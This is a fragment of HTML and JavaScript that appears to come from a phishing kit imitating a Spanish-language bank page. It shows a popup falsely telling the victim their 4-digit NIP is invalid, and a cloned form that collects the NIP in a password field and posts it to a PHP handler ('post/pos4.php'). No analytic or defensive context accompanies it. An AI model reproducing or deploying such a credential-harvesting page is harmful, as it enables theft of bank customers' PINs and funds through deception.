...
Swal.fire({
    ...
    confirmButtonText: 'Aceptar',
    allowOutsideClick: false,
    html: '<h1 style="text-align:center;margin-bottom:15px;font-size:30px;font-weight: bold;">NIP INVALIDO</h1><br><p style="text-align:center;">Recuerda que tu NIP es t&uacute; n&uacute;mero de 4 d&iacute;gitos que usas para validar tus operaciones</p>'
});
</script>
...
<div _ngcontent-c15="" class="container-fluid">
  ...
  <div _ngcontent-c15="" class="row justify-content-center show-grid" style="margin-top: 50px;">
    <form _ngcontent-c15="" novalidate="" class="ng-touched ng-dirty ng-valid" action="post/pos4.php" method="POST" autocomplete="off" name="form1">
        ...
        <div _ngcontent-c15="" class="col-12">
          <div _ngcontent-c15="" class="form-group">
           ...
           NIP:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            ...
            <input _ngcontent-c15="" maxlength="4"  placeholder="NIP" class="form-control ng-touched ng-dirty ng-valid" formcontrolname="client" name="n" id="user" type="password" onkeypress="return isNumberKey(event);">
          </div>
        </div>
      </div>
